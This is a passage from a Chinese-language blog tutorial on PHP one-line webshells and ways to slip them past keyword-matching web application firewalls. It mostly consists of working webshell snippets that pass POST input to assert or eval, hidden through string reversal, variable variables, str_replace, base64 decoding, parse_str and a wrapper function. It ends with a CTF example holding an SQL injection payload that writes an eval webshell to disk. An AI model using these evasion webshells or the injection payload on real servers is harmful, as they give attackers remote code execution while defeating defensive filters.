</span></span></code></pre><p>利用函数生成木马文件，第一个参数是文件名，第二个参数是文件内容<h1 id=yi-ju-hua-mu-ma-rao-guo-waf>一句话木马绕过waf<a aria-label="Anchor link for: yi-ju-hua-mu-ma-rao-guo-waf" class=zola-anchor href=#yi-ju-hua-mu-ma-rao-guo-waf style=visibility:hidden></a></h1><p>WAF （Web 应用防火墙）用于保护 Web 应用不被各类应用层攻击,如跨站脚本(XSS)、SQL注入、cookie中毒等，通常以关键字判断是否为一句话木马。<p><strong>本节仅是绕过一些基础的关键字查杀 WAF，更多免杀请产考：</strong><a rel="noopener nofollow noreferrer" href=https://xz.aliyun.com/t/9246 target=_blank>免杀/一句话木马(PHP)</a><h2 id=bian-liang-han-shu>变量函数<a aria-label="Anchor link for: bian-liang-han-shu" class=zola-anchor href=#bian-liang-han-shu style=visibility:hidden></a></h2><p><strong>变量函数(可变函数)</strong> : 变量名后有圆括号，PHP将寻找与变量的值同名的函数，并尝试执行。<strong>即使用变量作为函数名的函数</strong><p><strong>注意: eval是一个语言构造器而不是一个函数，不能被变量函数调用。</strong><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>test</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">assert</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-invoke z-php"><span class="z-punctuation z-definition z-variable z-php">$</span><span class="z-variable z-other z-php">test</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p>有时需要使用大小写混淆、字符串拼接、字符串逆序等变化达到绕过<pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">TR</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-keyword z-operator z-string z-php">.</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">Es</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-keyword z-operator z-string z-php">.</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">sA</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>b</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-string z-php">strtolower</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>c</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-string z-php">strrev</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>b</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-invoke z-php"><span class="z-punctuation z-definition z-variable z-php">$</span><span class="z-variable z-other z-php">c</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><h2 id=ke-bian-bian-liang>可变变量<a aria-label="Anchor link for: ke-bian-bian-liang" class=zola-anchor href=#ke-bian-bian-liang style=visibility:hidden></a></h2><p><strong>eval不可用，与可变函数同理</strong><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>bb</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">assert</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">bb</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-invoke z-php"><span class="z-punctuation z-definition z-variable z-php">$$</span><span class="z-variable z-other z-php">a</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">$$a = ${$a} = ${'bb'} = $bb = "assert"
</span></span></code></pre><h2 id=str-replace-han-shu><code>str_replace</code> 函数<a aria-label="Anchor link for: str-replace-han-shu" class=zola-anchor href=#str-replace-han-shu style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-string z-php">str_replace</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">Hell</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-punctuation z-separator z-php">,</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-punctuation z-separator z-php">,</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">assHellert</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-invoke z-php"><span class="z-punctuation z-definition z-variable z-php">$</span><span class="z-variable z-other z-php">a</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p>在第三个参数中查找第一个参数，并将其替换为第二个参数，这里第二个参数为空字符串，相应删除 <code>Hell</code><h2 id=base64-decode-han-shu><code>base64_decode</code> 函数<a aria-label="Anchor link for: base64-decode-han-shu" class=zola-anchor href=#base64-decode-han-shu style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-keyword z-operator z-assignment z-php">=</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-url z-php">base64_decode</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">"</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">YXNzZXJ0</span><span class="z-punctuation z-definition z-string z-end z-php">"</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-invoke z-php"><span class="z-punctuation z-definition z-variable z-php">$</span><span class="z-variable z-other z-php">a</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p><code>YXNzZXJ0</code> 是 <code>assert</code> 的base64编码<h2 id=parse-str-han-shu><code>parse_str</code> 函数<a aria-label="Anchor link for: parse-str-han-shu" class=zola-anchor href=#parse-str-han-shu style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic">parse_str("a=assert");
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">@$a($_POST['a']);
</span></span></code></pre><p>生成变量 <code>a</code> 并赋值 <code>assert</code><h2 id=zi-ding-yi-han-shu>自定义函数<a aria-label="Anchor link for: zi-ding-yi-han-shu" class=zola-anchor href=#zi-ding-yi-han-shu style=visibility:hidden></a></h2><pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function z-php"><span class="z-storage z-type z-function z-php">function</span> <span class="z-entity z-name z-function z-php">fun</span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-variable z-parameter z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-begin z-php">{</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-construct z-php">eval</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>a</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-operator z-error-control z-php">@</span><span class="z-meta z-function-call z-php"><span class="z-variable z-function z-php">fun</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_POST</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">shell</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span></code></pre><p>使用自定义函数调用<code>eval</code><p>通常都是使用多个组合才能达到绕过 WAF 的目的。<p>在函数前加 <code>@</code> 符，可让php语句不显示错误信息，加强隐蔽性。<p>一道简单ctf，是ctfshow里面的：<p><img alt=img src=/imgs/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0.assets/20201202004532573.png><p>可以用payload做，访问txt。当然也可以构造一句话<code>1'union select "&LT?php @eval($_POST['cmd']);?>" into outfile 'C:/phpStudy/WWW/shell.php'--+</code>来写入一句话木马</article><div class="reaction right" data-endpoint="https://reaction.woaikanpika123.workers.dev "></div><div class=giscus></div><script async crossorigin data-category=General data-category-id=DIC_kwDONtXUfc4CrRaB data-emit-metadata=0 data-input-position=bottom data-lang=en data-mapping=pathname data-reactions-enabled=1 data-repo=lbsucceed/lbsucceed.github.io data-repo-id=R_kgDONtXUfQ data-strict=0 data-theme=noborder_light src=https://giscus.app/client.js></script></div><footer><div class=copyright><p>© 2025 lbsucceed</div></footer></main></div><script src=/js/lightense.min.js></script><script type=module>import a from"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs";a.initialize({startOnLoad:!0})</script><script src=/js/main.js></script>